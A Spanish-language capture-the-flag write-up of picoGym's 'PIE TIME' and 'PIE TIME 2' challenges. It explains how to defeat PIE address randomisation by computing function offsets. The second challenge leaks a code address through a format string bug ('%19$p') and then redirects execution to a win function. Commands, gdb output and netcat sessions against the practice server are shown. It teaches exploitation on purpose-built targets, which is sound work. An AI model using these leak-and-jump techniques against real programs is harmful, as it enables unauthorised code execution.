---
layout: post
title: PIE TIME PicoGym
comments: true
categories: [Pwn, Writeups, PicoCTF]
---

En este post estaremos resolviendo un reto del [PicoGym](https://play.picoctf.org/practice/challenge/490?category=6&page=1&retired=0) y su segunda parte. Son retos sencillitos pero que sirven para entender el concepto de PIE.

<br>
![Image]({{ site.baseurl }}/images/posts/picoGym/pico_logo.png){:width="200px"}
<br>

# PIE TIME

## Reconocimiento

   > Can you try to get the flag? Beware we have PIE!

En este reto se nos da el siguiente programa:

```c
int win() {
  FILE *fptr;
  char c;

  printf("You won!\n");
  // Open file
  fptr = fopen("flag.txt", "r");
  if (fptr == NULL)
  {
      printf("Cannot open file.\n");
      exit(0);
  }

  // Read contents from file
  c = fgetc(fptr);
  while (c != EOF)
  {
      printf ("%c", c);
      c = fgetc(fptr);
  }

  printf("\n");
  fclose(fptr);
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  printf("Address of main: %p\n", &main);

  unsigned long val;
  printf("Enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);
  printf("Your input: %lx\n", val);

  void (*foo)(void) = (void (*)())val;
  foo();
}
```

Como vemos el programa nos muestra la dirección de `main` y nos permite saltar a la dirección que queramos. Este salto es bastante útil si tuviéramos la dirección de `win`.

### PIE

El problema surge al analizar el binario con *checksec*. Veremos que tiene activada la protección PIE, que hace que las direcciones se aleatoricen en base a un offset cada vez que se ejecute el binario.

Para saltarnos esta protección podemos tratar de calcular el offset desde `win` hasta `main` para poder calcular la dirección de `win` en tiempo de ejecución.

```
win = offset + main
```

## Explotación

Con *gdb* (en mi caso *gdb-peda*) podemos ver las direcciones de ambas funciones antes del PIE:

```bash
gdb-peda$ info functions 
[...]
0x00000000000012a7  win
0x000000000000133d  main
```

```
offset = 0x000000000000133d - 0x00000000000012a7 = 0x96
```

Sabiendo el offset podemos ejecutar y restar dicho offset a la dirección que nos dan:

```bash
nc rescued-float.picoctf.net 56618
Address of main: 0x62587a0ee33d
Enter the address to jump to, ex => 0x12345: 0x62587a0ee2a7 <- (0x62587a0ee33d - 0x96)
Your input: 62587a0ee2a7
You won!
picoCTF{<REDACTED>}
```

<br>

# PIE TIME 2

   > Can you try to get the flag? I'm not revealing anything anymore!!

La segunda parte es exactamente igual que la primera, pero por desgracia no nos dan el *leak* con la dirección de `main`

## Reconocimiento

Si analizamos el código veremos que la lógica ahora es algo más extensa (solo he incluido lo más relevante):

```c
void call_functions() {
  char buffer[64];
  printf("Enter your name:");
  fgets(buffer, 64, stdin);
  printf(buffer);

  unsigned long val;
  printf(" enter the address to jump to, ex => 0x12345: ");
  scanf("%lx", &val);

  void (*foo)(void) = (void (*)())val;
  foo();
}

int main() {
  signal(SIGSEGV, segfault_handler);
  setvbuf(stdout, NULL, _IONBF, 0); // _IONBF = Unbuffered

  call_functions();
  return 0;
}
```

Como podemos ver, en la llamada a `call_functions` hay una vulnerabilidad de tipo *Format String*, con esta vulnerabilidad podemos tratar de *leakear* una dirección del binario para poder calcular la dirección de `win` con el PIE.

## Explotación

Con ayuda de *gdb-peda* podemos utilizar el especificador `%<posicion>$p` para ir extrayendo valores del stack y compararlos con las direcciones de las funciones del binario. En este caso el valor 19 del stack parece ser parte de main:

```bash
Enter your name:%19$p
0x555555555441
```

```bash
gdb-peda$ disass main
Dump of assembler code for function main:
   0x0000555555555400 <+0>:	endbr64
   0x0000555555555404 <+4>:	push   rbp
   0x0000555555555405 <+5>:	mov    rbp,rsp
   0x0000555555555408 <+8>:	lea    rsi,[rip+0xfffffffffffffe9a]        # 0x5555555552a9 <segfault_handler>
   0x000055555555540f <+15>:	mov    edi,0xb
   0x0000555555555414 <+20>:	call   0x555555555170 <signal@plt>
   0x0000555555555419 <+25>:	mov    rax,QWORD PTR [rip+0x2bf0]        # 0x555555558010 <stdout@@GLIBC_2.2.5>
   0x0000555555555420 <+32>:	mov    ecx,0x0
   0x0000555555555425 <+37>:	mov    edx,0x2
   0x000055555555542a <+42>:	mov    esi,0x0
   0x000055555555542f <+47>:	mov    rdi,rax
   0x0000555555555432 <+50>:	call   0x555555555180 <setvbuf@plt>
   0x0000555555555437 <+55>:	mov    eax,0x0
   0x000055555555543c <+60>:	call   0x5555555552c7 <call_functions>
   0x0000555555555441 <+65>:	mov    eax,0x0
   0x0000555555555446 <+70>:	pop    rbp
   0x0000555555555447 <+71>:	ret

gdb-peda$ disass win
Dump of assembler code for function win:
   0x000055555555536a <+0>:	endbr64
   0x000055555555536e <+4>:	push   rbp
```

En este punto ya podemos calcular el offset desde ese punto hasta `win`:

```
0x555555555441 - 0x000055555555536a = 0xd7
```

Ya solo queda ejecutar aplicando lo anterior:

```bash
nc rescued-float.picoctf.net 49672
Enter your name:%19$p
0x64e5b1691441
 enter the address to jump to, ex => 0x12345: 0x64e5b169136a (0x64e5b1691441 - 0xd7)
You won!
picoCTF{<REDACTED>}
```

<br>